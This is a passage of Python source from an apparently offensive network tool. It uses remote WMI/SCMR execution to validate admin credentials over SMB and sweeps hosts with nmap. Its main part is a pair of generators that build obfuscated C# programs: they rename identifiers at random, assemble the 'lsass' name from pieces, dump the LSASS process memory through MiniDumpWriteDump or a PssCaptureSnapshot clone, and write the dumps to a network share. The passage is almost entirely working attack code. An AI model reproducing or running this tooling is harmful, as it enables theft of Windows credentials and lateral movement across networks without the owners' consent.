        else:
            self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data, self.__shell_type)
        with open('{}/drives.txt'.format(cwd), 'a') as f:  # writing to a file gets around the issue of multithreading not being easily readable
            f.write(self.__outputBuffer)
            f.close()
        lognoprint('{}: {}\n'.format(self.__addr, self.__outputBuffer))
        if logging.getLogger().level == logging.DEBUG:
            print('{}: {}\n'.format(self.__addr, self.__outputBuffer))
        self.__outputBuffer = ''


class AuthFileSyntaxError(Exception):
    '''raised by load_smbclient_auth_file if it encounters a syntax error
    while loading the smbclient-style authentication file.'''

    def __init__(self, path, lineno, reason):
        self.path = path
        self.lineno = lineno
        self.reason = reason

    def __str__(self):
        return 'Syntax error in auth file %s line %d: %s' % (
            self.path, self.lineno, self.reason)


def load_smbclient_auth_file(path):
    '''Load credentials from an smbclient-style authentication file (used by
    smbclient, mount.cifs and others).  returns (domain, username, password)
    or raises AuthFileSyntaxError or any I/O exceptions.'''

    lineno = 0
    domain = None
    username = None
    password = None
    for line in open(path):
        lineno += 1

        line = line.strip()

        if line.startswith('#') or line == '':
            continue

        parts = line.split('=', 1)
        if len(parts) != 2:
            raise AuthFileSyntaxError(path, lineno, 'No "=" present in line')

        (k, v) = (parts[0].strip(), parts[1].strip())

        if k == 'username':
            username = v
        elif k == 'password':
            password = v
        elif k == 'domain':
            domain = v
        else:
            raise AuthFileSyntaxError(path, lineno, 'Unknown option %s' % repr(k))

    return (domain, username, password)


############################################################################### END OF WMIEXEC#####################################################

def check_accts(username, password, domain, remoteName, remoteHost, hashes=None, aesKey=None, doKerberos=None, kdcHost=None, port=445):
    upasscombo = '{}:{}'.format(username, password)

    nthash = ''
    lmhash = ''
    if hashes is not None:
        lmhash, nthash = hashes.split(':')
        upasscombo = '{}:{}'.format(username, nthash)

    stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
    logging.debug('StringBinding %s' % stringbinding)
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(remoteHost)
    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

    rpctransport.set_kerberos(doKerberos, kdcHost)

    try:
        samr = rpctransport.get_dce_rpc()
        try:
            samr.connect()
        except Exception as e:
            acct_chk_fail.append(username)
            printnlog('{} {} {}'.format(red_minus, upasscombo.ljust(30), str(e)[:str(e).find("(")]))

        s = rpctransport.get_smb_connection()
        s.setTimeout(100000)
        samr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(samr)
        scHandle = resp['lpScHandle']
        acct_chk_valid.append(username)
        printnlog('{} {} {}'.format(gold_plus, upasscombo.ljust(30), "Valid Admin Creds"))


    except  (Exception, KeyboardInterrupt) as e:
        if str(e).find("rpc_s_access_denied") != -1 and str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
            acct_chk_valid.append(username)
            printnlog('{} {} {}'.format(green_plus, upasscombo.ljust(30), "Valid Creds"))


def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan thigns we dont need to
    printnlog('\n[scanning hosts]')
    scanner = nmap.PortScanner()
    if os.path.isfile(inpu):  # if its in a file the arguments are different
        scanner.scan(arguments='-n -sn -iL {}'.format(inpu))
    else:
        scanner.scan(hosts=inpu, arguments='-n -sn')
    uphosts = scanner.all_hosts()

    try:
        uphosts.remove(local_ip)  # no point in attacking ourselves
    except:
        pass

    printnlog('[scan complete]')

    return uphosts

def gen_payload_exe_mdwd(share_name, payload_name, addresses_array, drive_letter):
    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    bRet = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    GetPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    processes = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    id = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    namespace = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    Program = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    fs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    exe_payload = ''
    exe_payload += 'using System;\n'
    exe_payload += 'using System.IO;\n'
    exe_payload += 'using System.Text;\n'
    exe_payload += 'using System.Linq;\n'
    exe_payload += 'using System.ComponentModel;\n'
    exe_payload += 'using System.Diagnostics;\n'
    exe_payload += 'using System.Runtime.InteropServices;\n'
    exe_payload += 'using System.Collections.Generic;\n'
    exe_payload += 'using System.Threading;\n'
    exe_payload += 'using System.Security.Principal;\n'

    exe_payload += 'namespace %s\n' % (namespace)
    exe_payload += '{\n'
    exe_payload += '    class %s\n' % (Program)
    exe_payload += '    {\n'

    exe_payload += "		public enum Typ : uint\n"
    exe_payload += "        {\n"
    exe_payload += "            %s = 0x00000001,\n" % (MiniDumpWithDataSegs)
    exe_payload += "            %s = 0x00000002,\n" % (MiniDumpWithFullMemory)
    exe_payload += "            %s = 0x00000004,\n" % (MiniDumpWithHandleData)
    exe_payload += "            %s = 0x00001000,\n" % (MiniDumpWithThreadInfo)
    exe_payload += "            %s = 0x00040000,\n" % (MiniDumpWithTokenInformation)
    exe_payload += "        };\n"

    exe_payload += "        [System.Runtime.InteropServices.DllImport(\"dbghelp.dll\",\n"
    exe_payload += "              EntryPoint = \"MiniDumpWriteDump\",\n"
    exe_payload += "              CallingConvention = CallingConvention.StdCall,\n"
    exe_payload += "              CharSet = CharSet.Unicode,\n"
    exe_payload += "              ExactSpelling = true, SetLastError = true)]\n"
    exe_payload += "        static extern bool MiniDumpWriteDump(\n"
    exe_payload += "              IntPtr hProcess,\n"
    exe_payload += "              uint processId,\n"
    exe_payload += "              IntPtr hFile,\n"
    exe_payload += "              uint dumpType,\n"
    exe_payload += "              IntPtr expParam,\n"
    exe_payload += "              IntPtr userStreamParam,\n"
    exe_payload += "              IntPtr callbackParam);\n"

    exe_payload += "        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)\n" % (Dump, filename, dumpTyp, prochandle, procid)
    exe_payload += "        {\n"
    exe_payload += "            using (var %s = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n" % (fs, filename)
    exe_payload += "            {\n"
    exe_payload += "                bool %s = MiniDumpWriteDump(\n" % (bRet)
    exe_payload += "                  %s,\n" % (prochandle)
    exe_payload += "                  %s,\n" % (procid)
    exe_payload += "                  %s.SafeFileHandle.DangerousGetHandle(),\n" % (fs)
    exe_payload += "                  (uint)%s,\n" % (dumpTyp)
    exe_payload += "                  IntPtr.Zero,\n"
    exe_payload += "                  IntPtr.Zero,\n"
    exe_payload += "                  IntPtr.Zero);\n"
    exe_payload += "                if (!%s)\n" % (bRet)
    exe_payload += "                {\n"
    exe_payload += "                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n"
    exe_payload += "                }\n"
    exe_payload += "                return %s;\n" % (bRet)
    exe_payload += "            }\n"
    exe_payload += "        }\n"

    exe_payload += "        public static int %s() {\n" % (GetPID)
    exe_payload += "            string %s = \"s\";\n" % (s)
    exe_payload += "            string %s = \"l\";\n" % (l)
    exe_payload += "            string %s = \"a\";\n" % (a)
    exe_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
    exe_payload += "            var %s = 0;\n" % (id)
    exe_payload += "            foreach (var %s in %s)\n" % (process, processes)
    exe_payload += "            {\n"
    exe_payload += "                %s = %s.Id;\n" % (id, process)
    exe_payload += "            }\n"

    exe_payload += "            return %s;\n" % (id)
    exe_payload += "        }\n"

    exe_payload += "        public static bool %s()\n" % (IsAdministrator)
    exe_payload += "        {\n"
    exe_payload += "            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n"
    exe_payload += "                      .IsInRole(WindowsBuiltInRole.Administrator);\n"
    exe_payload += "        }\n"

    exe_payload += '        static void Main(string[] args)\n'
    exe_payload += '        {\n'
    exe_payload += "            if (%s())\n" % (IsAdministrator)
    exe_payload += "            {\n"
    exe_payload += "                var %s = System.IO.File.ReadLines(\"%s:\\\\%s.txt\").ToArray();\n" % (lines, drive_letter, addresses_file)
    exe_payload += "                string %s = \"\";\n" % (thismachinesip)
    exe_payload += "                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n" % (ipEntry)
    exe_payload += "                foreach (var %s in %s.AddressList)\n" % (ip, ipEntry)
    exe_payload += "                {\n"
    exe_payload += "                    for (int %s = 0; %s < %s.Length; %s++)\n" % (i, i, lines, i)
    exe_payload += "                    {\n"
    exe_payload += "                        if (%s.ToString() == %s[%s].ToString())\n" % (ip, lines, i)
    exe_payload += "                        {\n"
    exe_payload += "                            %s = \"-\" + %s.ToString();\n" % (thismachinesip, ip)
    exe_payload += "                        }\n"
    exe_payload += "                    }\n"
    exe_payload += "                }\n"

    exe_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
    exe_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
    exe_payload += "                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);\n" % (Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)

    exe_payload += "            }\n"

    exe_payload += '        }\n'
    exe_payload += '    }\n'  # end of class
    exe_payload += '}\n'  # end of namespace

    with open('/var/tmp/{}/pl.cs'.format(share_name), 'w') as f:
        f.write(exe_payload)
        f.close()

    os.system('sudo mcs -out:/var/tmp/{}/{}.exe /var/tmp/{}/pl.cs -unsafe'.format(share_name, payload_name, share_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))

    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()

def gen_payload_exe_pss(share_name, payload_name, addresses_array, drive_letter):
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_VA_CLONE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_HANDLES = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_HANDLE_NAME_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_HANDLE_BASIC_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_HANDLE_TRACE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_THREADS = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_THREAD_CONTEXT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CREATE_MEASURE_PERFORMANCE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_CAPTURE_FLAGS = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MINIDUMP_CALLBACK_TYPE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpSnapshot = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MINIDUMP_CALLBACK_OUTPUT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MINIDUMP_CALLBACK_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    Status = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    CallbackRoutine = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    CallbackParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_QUERY_INFORMATION_CLASS = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PMINIDUMP_CALLBACK_INPUT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PMINIDUMP_CALLBACK_OUTPUT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PMINIDUMP_EXCEPTION_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PMINIDUMP_USER_STREAM_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PMINIDUMP_CALLBACK_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    PSS_QUERY_VA_CLONE_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MINIDUMP_TYPE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithUnloadedModules = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithProcessThreadData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithPrivateReadWriteMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithFullMemoryInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithPrivateWriteCopyMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithModuleHeaders = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    sHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    Program = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    lsass = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    h = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    pro = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    processid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    hresult = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    CbackDelegate = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    CbackParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    obj = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    pointr = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MFlag = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    VcHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    cloneProid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    exe_payload = ''
    exe_payload += 'using System;\n'
    exe_payload += 'using System.IO;\n'
    exe_payload += 'using System.Linq;\n'
    exe_payload += 'using System.ComponentModel;\n'
    exe_payload += 'using System.Diagnostics;\n'
    exe_payload += 'using System.Runtime.InteropServices;\n'
    exe_payload += 'using DWORD = System.Int32;\n'
    exe_payload += 'using BOOL = System.Int32;\n'
    exe_payload += 'using HANDLE = System.IntPtr;\n'
    exe_payload += 'using HPSS = System.IntPtr;\n'
    exe_payload += 'using PVOID = System.IntPtr;\n'
    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_CALLBACK_INPUT)
    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_CALLBACK_OUTPUT)
    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_EXCEPTION_INFORMATION)
    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_USER_STREAM_INFORMATION)
    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_CALLBACK_INFORMATION)

    exe_payload += 'namespace %s\n' % (MiniDumpSnapshot)
    exe_payload += '{\n'
    exe_payload += '    internal enum %s : uint\n' % (MINIDUMP_CALLBACK_TYPE)
    exe_payload += '    {\n'
    exe_payload += '        ModuleCallback,\n'
    exe_payload += '        ThreadCallback,\n'
    exe_payload += '        ThreadExCallback,\n'
    exe_payload += '        IncludeThreadCallback,\n'
    exe_payload += '        IncludeModuleCallback,\n'
    exe_payload += '        MemoryCallback,\n'
    exe_payload += '        CancelCallback,\n'
    exe_payload += '        WriteKernelMinidumpCallback,\n'
    exe_payload += '        KernelMinidumpStatusCallback,\n'
    exe_payload += '        RemoveMemoryCallback,\n'
    exe_payload += '        IncludeVmRegionCallback,\n'
    exe_payload += '        IoStartCallback,\n'
    exe_payload += '        IoWriteAllCallback,\n'
    exe_payload += '        IoFinishCallback,\n'
    exe_payload += '        ReadMemoryFailureCallback,\n'
    exe_payload += '        SecondaryFlagsCallback,\n'
    exe_payload += '        IsProcessSnapshotCallback,\n'
    exe_payload += '        VmStartCallback,\n'
    exe_payload += '        VmQueryCallback,\n'
    exe_payload += '        VmPreReadCallback,\n'
    exe_payload += '    }\n'

    exe_payload += '    struct %s\n' % (MINIDUMP_CALLBACK_OUTPUT)
    exe_payload += '    {\n'
    exe_payload += '        public int %s; \n' % (Status)
    exe_payload += '    }\n'

    exe_payload += '    internal struct %s\n' % (MINIDUMP_CALLBACK_INFORMATION)
    exe_payload += '    {\n'
    exe_payload += '        public IntPtr %s;\n' % (CallbackRoutine)
    exe_payload += '        public PVOID %s;\n' % (CallbackParam)
    exe_payload += '    }\n'
    exe_payload += '    [Flags]\n'
    exe_payload += '    internal enum %s : uint\n' % (PSS_CAPTURE_FLAGS)
    exe_payload += '    {\n'
    exe_payload += '        %s = 0x00000001,\n' % (PSS_CAPTURE_VA_CLONE)
    exe_payload += '        %s = 0x00000004,\n' % (PSS_CAPTURE_HANDLES)
    exe_payload += '        %s = 0x00000008,\n' % (PSS_CAPTURE_HANDLE_NAME_INFORMATION)
    exe_payload += '        %s = 0x00000010,\n' % (PSS_CAPTURE_HANDLE_BASIC_INFORMATION)
    exe_payload += '        %s = 0x00000020,\n' % (PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION)
    exe_payload += '        %s = 0x00000040,\n' % (PSS_CAPTURE_HANDLE_TRACE)
    exe_payload += '        %s = 0x00000080,\n' % (PSS_CAPTURE_THREADS)
    exe_payload += '        %s = 0x00000100,\n' % (PSS_CAPTURE_THREAD_CONTEXT)
    exe_payload += '        %s = 0x40000000,\n' % (PSS_CREATE_MEASURE_PERFORMANCE)
    exe_payload += '    }\n'

    exe_payload += '    internal enum %s\n' % (PSS_QUERY_INFORMATION_CLASS)
    exe_payload += '    {\n'
    exe_payload += '        %s = 1,\n' % (PSS_QUERY_VA_CLONE_INFORMATION)
    exe_payload += '    }\n'

    exe_payload += '    [Flags]\n'
    exe_payload += '    internal enum %s : int\n' % (MINIDUMP_TYPE)
    exe_payload += '    {\n'
    exe_payload += '        %s = 0x00000001,\n' % (MiniDumpWithDataSegs)
    exe_payload += '        %s = 0x00000002,\n' % (MiniDumpWithFullMemory)
    exe_payload += '        %s = 0x00000004,\n' % (MiniDumpWithHandleData)
    exe_payload += '        %s = 0x00000020,\n' % (MiniDumpWithUnloadedModules)
    exe_payload += '        %s = 0x00000100,\n' % (MiniDumpWithProcessThreadData)
    exe_payload += '        %s = 0x00000200,\n' % (MiniDumpWithPrivateReadWriteMemory)
    exe_payload += '        %s = 0x00000800,\n' % (MiniDumpWithFullMemoryInfo)
    exe_payload += '        %s = 0x00001000,\n' % (MiniDumpWithThreadInfo)
    exe_payload += '        %s = 0x00010000,\n' % (MiniDumpWithPrivateWriteCopyMemory)
    exe_payload += '        %s = 0x00040000,\n' % (MiniDumpWithTokenInformation)
    exe_payload += '        %s = 0x00080000,\n' % (MiniDumpWithModuleHeaders)
    exe_payload += '    }\n'

    exe_payload += '    [UnmanagedFunctionPointer(CallingConvention.StdCall)]\n'
    exe_payload += '    internal delegate BOOL MiniDumpCallback(PVOID %s, %s CallbackInput, %s CallbackOutput);\n' % (CallbackParam, PMINIDUMP_CALLBACK_INPUT, PMINIDUMP_CALLBACK_OUTPUT)
    exe_payload += '    class %s\n' % (Program)
    exe_payload += '    {\n'
    exe_payload += '        [DllImport("dbghelp")]\n'
    exe_payload += '        internal static extern DWORD MiniDumpWriteDump(HANDLE hProcess, DWORD ProcessId, HANDLE hFile, %s DumpType, %s ExceptionParam, %s UserStreamParam, %s %s);\n' % (MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION, CallbackParam)

    exe_payload += '        internal static BOOL MiniDumpCallbackMethod(PVOID parameter, %s inp, %s op)\n' % (PMINIDUMP_CALLBACK_INPUT, PMINIDUMP_CALLBACK_OUTPUT)
    exe_payload += '        {\n'
    exe_payload += '            unsafe\n'
    exe_payload += '            {\n'
    exe_payload += '                if (Marshal.ReadByte(inp + sizeof(int) + IntPtr.Size) == (int)%s.IsProcessSnapshotCallback)\n' % (MINIDUMP_CALLBACK_TYPE)
    exe_payload += '                {\n'
    exe_payload += '                    var %s = (%s*)op;\n' % (obj, MINIDUMP_CALLBACK_OUTPUT)
    exe_payload += '                    %s->%s = 1;\n' % (obj, Status)
    exe_payload += '                }\n'
    exe_payload += '           }\n'

    exe_payload += '            return 1;\n'
    exe_payload += '        }\n'

    exe_payload += '        [DllImport("kernel32")]\n'
    exe_payload += '        internal static extern DWORD PssQuerySnapshot(HPSS SnapshotHandle, %s InformationClass, out IntPtr Buffer, DWORD BufferLength);\n' % (PSS_QUERY_INFORMATION_CLASS)

    exe_payload += '        [DllImport("kernel32")]\n'
    exe_payload += '        internal static extern DWORD PssCaptureSnapshot(HANDLE ProcessHandle, %s CaptureFlags, DWORD ThreadContextFlags, out HPSS SnapshotHandle);\n' % (PSS_CAPTURE_FLAGS)

    exe_payload += '        [DllImport("kernel32")]\n'
    exe_payload += '        internal static extern DWORD PssFreeSnapshot(HANDLE ProcessHandle, HPSS SnapshotHandle);\n'

    exe_payload += '        [DllImport("kernel32")]\n'
    exe_payload += '        internal static extern BOOL CloseHandle(HANDLE hObject);\n'

    exe_payload += '        [DllImport("kernel32")]\n'
    exe_payload += '        internal static extern BOOL GetProcessId(HANDLE hObject);\n'

    exe_payload += '        static int Main(string[] args)\n'
    exe_payload += '        {\n'

    exe_payload += '            Process[] %s = Process.GetProcessesByName("l"+"s"+"as"+"s");\n' % (lsass)
    exe_payload += '            int %s = %s[0].Id;\n' % (processid, lsass)
    exe_payload += '            HANDLE %s;\n' % (h)
    exe_payload += '            try\n'
    exe_payload += '            {\n'
    exe_payload += '                var %s = Process.GetProcessById(%s);\n' % (pro, processid)
    exe_payload += '                %s = %s.Handle;\n' % (h, pro)
    exe_payload += '            }\n'
    exe_payload += '            catch (ArgumentException)\n'
    exe_payload += '           {\n'
    exe_payload += '                Console.WriteLine("Process does not exist");\n'
    exe_payload += '                return -2;\n'
    exe_payload += '            }\n'

    exe_payload += '            var flags = %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_VA_CLONE)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLES)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_NAME_INFORMATION)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_BASIC_INFORMATION)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_TRACE)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREADS)
    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREAD_CONTEXT)
    exe_payload += '                        %s.%s;\n' % (PSS_CAPTURE_FLAGS, PSS_CREATE_MEASURE_PERFORMANCE)

    exe_payload += '            HPSS %s;\n' % (sHandle)

    exe_payload += '            DWORD %s = PssCaptureSnapshot(%s, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out %s);\n' % (hresult, h, sHandle)

    exe_payload += '            if (%s != 0)\n' % (hresult)
    exe_payload += '            {\n'
    exe_payload += '                Console.WriteLine("Snapshot failed :( ({%s})");\n' % (hresult)
    exe_payload += '                return %s;\n' % (hresult)
    exe_payload += '            }\n'

    exe_payload += '                var %s = System.IO.File.ReadLines("%s:\\\\%s.txt").ToArray();\n' % (lines, drive_letter, addresses_file)
    exe_payload += '                string %s = "";\n' % (thismachinesip)
    exe_payload += '                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n' % (ipEntry)
    exe_payload += '                foreach (var %s in %s.AddressList)\n' % (ip, ipEntry)
    exe_payload += '                {\n'
    exe_payload += '                    for (int %s = 0; %s < %s.Length; %s++)\n' % (i, i, lines, i)
    exe_payload += '                    {\n'
    exe_payload += '                        if (%s.ToString() == %s[%s].ToString())\n' % (ip, lines, i)
    exe_payload += '                        {\n'
    exe_payload += '                            %s = "-" + %s.ToString();\n' % (thismachinesip, ip)
    exe_payload += '                        }\n'
    exe_payload += '                    }\n'
    exe_payload += '                }\n'

    exe_payload += '            using (var %s = new FileStream("%s:\\\\" + System.Net.Dns.GetHostName() + %s + ".dmp", FileMode.Create))\n' % (file, drive_letter, thismachinesip)
    exe_payload += '            {\n'
    exe_payload += '                var %s = new MiniDumpCallback(MiniDumpCallbackMethod);\n' % (CbackDelegate)
    exe_payload += '                var %s = Marshal.AllocHGlobal(IntPtr.Size * 2);\n' % (CbackParam)

    exe_payload += '                unsafe\n'
    exe_payload += '                {\n'
    exe_payload += '                    var %s = (%s*)%s;\n' % (pointr, MINIDUMP_CALLBACK_INFORMATION, CbackParam)
    exe_payload += '                    %s->%s = Marshal.GetFunctionPointerForDelegate(%s);\n' % (pointr, CallbackRoutine, CbackDelegate)
    exe_payload += '                    %s->%s = IntPtr.Zero;\n' % (pointr, CallbackParam)
    exe_payload += '                }\n'

    exe_payload += '                var %s = %s.%s |\n' % (MFlag, MINIDUMP_TYPE, MiniDumpWithDataSegs)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithTokenInformation)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithPrivateWriteCopyMemory)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithPrivateReadWriteMemory)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithUnloadedModules)
